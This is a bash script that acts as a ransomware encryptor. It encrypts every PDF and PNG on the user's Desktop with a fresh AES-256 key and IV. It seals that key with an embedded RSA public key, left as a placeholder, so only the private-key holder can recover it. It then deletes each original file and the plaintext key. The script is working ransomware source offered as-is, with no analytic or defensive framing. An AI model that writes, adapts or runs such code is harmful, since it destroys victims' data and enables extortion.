#!/bin/bash

DESKTOP="$HOME/Desktop"
TEMP_PUBKEY="/tmp/temp_pub.pem"

# === Write hardcoded RSA PUBLIC KEY ===
cat > "$TEMP_PUBKEY" <<EOF
-----BEGIN PUBLIC KEY-----
put your public key in here 
-----END PUBLIC KEY-----
EOF

echo "[+] Starting encryption..."

for FILE in "$DESKTOP"/*.pdf "$DESKTOP"/*.png; do
    [ -f "$FILE" ] || continue

    BASENAME="${FILE%.*}"
    EXT="${FILE##*.}"

    AES_KEY=$(openssl rand -hex 32)
    AES_IV=$(openssl rand -hex 16)

    openssl enc -aes-256-cbc -in "$FILE" -out "${FILE}.enc" -K "$AES_KEY" -iv "$AES_IV"

    echo -n "$AES_KEY$AES_IV" | xxd -r -p > "${BASENAME}.kiv.bin"

    openssl pkeyutl -encrypt -pubin -inkey "$TEMP_PUBKEY" -in "${BASENAME}.kiv.bin" \
        -out "${BASENAME}.${EXT}.key.enc" -pkeyopt rsa_padding_mode:oaep

    rm -f "${BASENAME}.kiv.bin"
    rm -f "$FILE"

    echo "[✔] Encrypted $FILE"
done

rm -f "$TEMP_PUBKEY"
echo "[✔] All encryption complete."
